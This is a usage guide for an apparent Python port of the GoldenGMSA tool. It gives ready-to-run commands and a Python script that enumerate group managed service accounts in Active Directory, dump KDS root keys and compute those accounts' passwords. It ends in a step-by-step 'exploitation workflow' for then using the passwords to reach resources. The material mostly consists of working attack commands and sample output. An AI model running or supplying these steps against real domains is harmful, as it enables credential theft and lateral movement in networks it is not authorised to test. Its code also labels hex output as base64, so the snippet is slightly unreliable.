# GoldenGMSA Python Usage Examples

## Prerequisites

- Network access to the Active Directory domain controller
- Valid credentials for the domain
- Python 3.7+ with dependencies installed

## Usage Scenarios

### 1. Enumerating gMSAs from a Linux Host

```bash
# Connect to the domain and enumerate all gMSA accounts
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local gmsainfo

# With a specific DC (by IP)
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local --dc-ip 10.10.10.5 gmsainfo

# Using LDAPS for a secure connection
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local --use-ssl gmsainfo
```

**Expected output:**
```
Authenticating to domain corp.local...
Connected to domain corp.local

sAMAccountName:         svc_gmsa$
objectSid:              S-1-5-21-123456789-987654321-111111111-1234
rootKeyGuid:            46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaAEAABAAAAADAAAA...
----------------------------------------------
```

### 2. Extracting KDS Root Keys

```bash
# Dump all KDS root keys (requires elevated privileges)
python main.py -u 'admin@corp.local' -p 'AdminP@ss' --domain corp.local kdsinfo

# Dump a specific key by GUID
python main.py -u 'admin@corp.local' -p 'AdminP@ss' --domain corp.local kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
```

### 3. Computing gMSA Password (Online Mode)

```bash
# Calculate the password of an identified gMSA
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local compute --sid S-1-5-21-123456789-987654321-111111111-1234

# With specific forest
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local --forest corp.local compute --sid S-1-5-21-123456789-987654321-111111111-1234
```

**Expected output:**
```
Authenticating to domain corp.local...
Connected to domain corp.local

Base64-encoded password:	YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkw...
```

### 4. Offline Mode (with exported data)

```bash
# If you have already extracted the KDS keys and msds-ManagedPasswordID
python main.py compute \
    --sid S-1-5-21-123456789-987654321-111111111-1234 \
    --kdskey AQAAALm45UZXyuYB6Ln7smfkresAAAAQAAAAMgAAADgAAAA... \
    --pwdid AQAAAEtEU0sCAAAAaAEAABAAAAADAAAA...
```

### 5. Authentication Formats

```bash
# UPN format (User Principal Name)
python main.py -u 'user@corp.local' -p 'password' --domain corp.local gmsainfo

# NetBIOS format
python main.py -u 'CORP\user' -p 'password' --domain corp.local gmsainfo

# Simple format (domain will be added automatically)
python main.py -u 'user' -p 'password' --domain corp.local gmsainfo
```

### 6. Complete Exploitation Workflow

```bash
# Step 1: Enumerate gMSAs
python main.py -u 'user@corp.local' -p 'password' --domain corp.local gmsainfo > gmsa_list.txt

# Step 2: Extract KDS keys (if sufficient privileges)
python main.py -u 'admin@corp.local' -p 'adminpass' --domain corp.local kdsinfo > kds_keys.txt

# Step 3: Calculate the password of a target gMSA
python main.py -u 'user@corp.local' -p 'password' --domain corp.local compute --sid <TARGET_SID>

# Step 4: Use the password to access resources
# (via impacket, evil-winrm, etc.)
```

### 7. Programmatic Usage in Python

```python
from golden_gmsa import LdapConnection, LdapUtils, GmsaAccount, RootKey, GmsaPassword

# Establish the connection
with LdapConnection(
    domain='corp.local',
    username='user@corp.local',
    password='password',
    dc_ip='10.10.10.5'
) as conn:
    LdapUtils.set_connection(conn)
    
    # Enumerate gMSAs
    gmsa_accounts = list(GmsaAccount.find_all_gmsa_accounts_in_domain('corp.local'))
    
    for gmsa in gmsa_accounts:
        print(f"Found gMSA: {gmsa.sam_account_name}")
        print(f"  SID: {gmsa.sid}")
        print(f"  Root Key GUID: {gmsa.managed_password_id.root_key_identifier}")
        
        # Extract the root key
        root_key = RootKey.get_root_key_by_guid('corp.local', 
                                                 gmsa.managed_password_id.root_key_identifier)
        
        if root_key:
            # Calculate the password
            password = GmsaPassword.get_password(
                gmsa.sid,
                root_key,
                gmsa.managed_password_id,
                'corp.local',
                'corp.local'
            )
            print(f"  Password (base64): {password.hex()}")
```

## Error Handling

### Error: "Invalid credentials"
```bash
# Verify the credentials
python main.py -u 'user@corp.local' -p 'wrong_password' --domain corp.local gmsainfo
# Error: Invalid credentials
```

### Error: "LDAP server unreachable"
```bash
# Use --dc-ip to specify the DC IP
python main.py -u 'user@corp.local' -p 'password' --domain corp.local --dc-ip 10.10.10.5 gmsainfo
```

### Error: "No results found"
```bash
# Verify that the user has the necessary permissions
# gMSA accounts require specific read permissions
```
